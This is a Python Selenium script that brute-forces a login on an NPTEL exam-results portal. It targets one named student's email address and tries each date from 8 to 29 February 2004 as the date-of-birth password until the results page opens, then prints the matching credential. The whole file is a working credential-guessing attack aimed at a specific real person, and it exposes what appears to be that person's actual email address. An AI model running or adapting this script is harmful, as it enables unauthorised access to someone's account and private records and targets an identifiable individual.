from datetime import datetime, timedelta
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from functions import*

# Generate dates
start_date = datetime.strptime("2004-02-08", "%Y-%m-%d")
end_date = datetime.strptime("2004-02-29", "%Y-%m-%d")
dates = [(start_date + timedelta(days=x)).strftime("%Y-%m-%d") for x in range((end_date - start_date).days + 1)]

driver = setup_driver(r"D:\Tools\chromedriver-win64\chromedriver.exe")

login_url = r"https://internalapp.nptel.ac.in/B2C/"
email = "gaurav_kumar.ug22@nsut.ac.in"

try:
    for date in dates:
        driver.get(login_url)
        
        # Quick login attempt
        driver.find_element(By.XPATH, "//input[@placeholder='Email ID']").send_keys(email)
        driver.find_element(By.XPATH, "//input[@placeholder='Password (Format: YYYY-MM-DD)']").send_keys(date, Keys.RETURN)
        
        # Check for error or success
        try:
            error = driver.find_element(By.CLASS_NAME, "error-message")
            if "sorry user don't exist" in error.text.lower():
                print(f"Tried: {date}")
                continue
        except NoSuchElementException:
            try:
                results = driver.find_element(By.LINK_TEXT, "Click to view Results: October 2024")
                print("\nSUCCESS! Date found:")
                print(f"\n{email},{date}")
                break
            except NoSuchElementException:
                continue
                
except Exception as e:
    print(f"Error: {str(e)}")
finally:
    driver.quit()